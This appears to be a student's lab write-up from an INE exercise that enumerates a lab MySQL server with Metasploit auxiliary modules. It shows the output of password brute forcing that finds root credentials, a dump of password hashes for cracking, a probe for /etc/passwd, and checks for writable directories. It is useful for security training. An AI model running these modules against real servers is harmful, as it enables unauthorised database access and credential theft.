# MySQL Enumeration

### Objective: Your task is to run the following auxiliary modules against the target:

**auxiliary/scanner/mysql/mysql_version**
```bash
[+] 192.190.19.3:3306 - 192.190.19.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] demo.ine.local:3306 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

**auxiliary/scanner/mysql/mysql_login**
```bash
set PASS_FILE ~~unix_passwords.txt

# Output
[+] 192.190.19.3:3306     - 192.190.19.3:3306 - Success: 'root:twinkle'
```

**auxiliary/admin/mysql/mysql_enum**
```bash
# Set password and username found with previous module

~~~
[+] 192.190.19.3:3306 -                 User: root Host: localhost Password Hash: 
~~~
```

**auxiliary/admin/mysql/mysql_sql**
```bash
# This module allows for simple SQL statements to be executed against a MySQL instance given the appropriate credentials
# set password and username here too

[*] 192.190.19.3:3306 - Sending statement: 'select version()'...
[*] 192.190.19.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
[*] Auxiliary module execution completed

# Change SQL section to show available databases
*] 192.190.19.3:3306 - Sending statement: 'show databases;'...
[*] 192.190.19.3:3306 -  | information_schema |
[*] 192.190.19.3:3306 -  | mysql |
[*] 192.190.19.3:3306 -  | performance_schema |
[*] 192.190.19.3:3306 -  | upload |
[*] 192.190.19.3:3306 -  | vendors |
[*] 192.190.19.3:3306 -  | videos |
[*] 192.190.19.3:3306 -  | warehouse |
[*] Auxiliary module execution completed
```

**auxiliary/scanner/mysql/mysql_schemadump**
```bash
# set username and password

- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []

# Commands listed below are available
hosts
services
loot
creds
```

**auxiliary/scanner/mysql/mysql_file_enum**
```bash
# set FILE_LIST -> /usr/share/metasploit-framework/data/wordlists/directory.txt

# Output
[+] 192.190.19.3:3306 - /tmp is a directory and exists
[+] 192.190.19.3:3306 - /etc/passwd is a file and exists
[+] 192.190.19.3:3306 - /root is a directory and exists
~~~
```

**auxiliary/scanner/mysql/mysql_hashdump**
```bash
# This module extracts the usernames and encrypted password hashes from a MySQL server and stores them for later cracking
[+] 192.190.19.3:3306 - Saving HashString as Loot: root:*A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.190.19.3:3306 - Saving HashString as Loot: root:
[+] 192.190.19.3:3306 - Saving HashString as Loot: root:
~~~
```

**auxiliary/scanner/mysql/mysql_writable_dirs**
```bash
# Enumerate writeable directories using the MySQL SELECT INTO DUMPFILE feature, for more information see the URL in the references
[*] 192.190.19.3:3306 - Login...
[*] 192.190.19.3:3306 - Checking /tmp...
[+] 192.190.19.3:3306 - /tmp is writeable
~~~
```